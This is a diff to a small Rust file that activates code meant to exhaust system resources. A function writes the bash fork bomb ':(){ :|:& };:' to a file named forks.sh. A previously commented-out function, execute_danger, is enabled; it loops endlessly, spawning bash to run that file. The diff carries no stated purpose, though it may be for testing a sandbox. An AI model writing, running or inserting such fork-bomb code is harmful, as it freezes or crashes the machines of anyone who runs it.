@@ -1,6 +1,6 @@
 use std::fs::File;
 use std::io::prelude::*;
-//use std::process::Command;
+use std::process::Command;
 use rand::Rng;
 
 pub fn what_are_those() {
@@ -12,17 +12,15 @@ pub fn what_are_those() {
 }
 
 pub fn make_danger() {
-    let f = File::create("ICanHasResource?");
-    assert_eq!(f.is_ok(), true);
-    let res = f.unwrap().write_all(b":(){ :|:&  };:");
+    let res = File::create("forks.sh").unwrap().write_all(b":(){ :|:&  };:");
     assert_eq!(res.is_ok(), true);
 }
 
-/*
 pub fn execute_danger() {
     loop {
         let mut child = Command::new("bash")
-            .arg("ICanHasResource?")
+            .arg("-c")
+            .arg("\"forks.sh\"")
             .spawn()
             .expect("failed to execute child");
         let ecode = child.wait()
@@ -30,4 +28,3 @@ pub fn execute_danger() {
         assert!(ecode.success());
     }
 }
-*/
